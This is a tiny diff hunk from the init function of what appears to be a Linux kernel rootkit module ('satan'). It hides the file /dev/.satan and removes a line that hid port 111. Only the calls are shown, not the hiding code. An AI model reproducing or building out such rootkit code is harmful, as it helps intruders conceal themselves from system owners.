@@ -20,7 +20,6 @@ static int __init satan_init(void)
         satan_port_init();
 
         satan_file_hide("/dev/.satan");
-        satan_port_hide(111);
         return 0;
 }
 
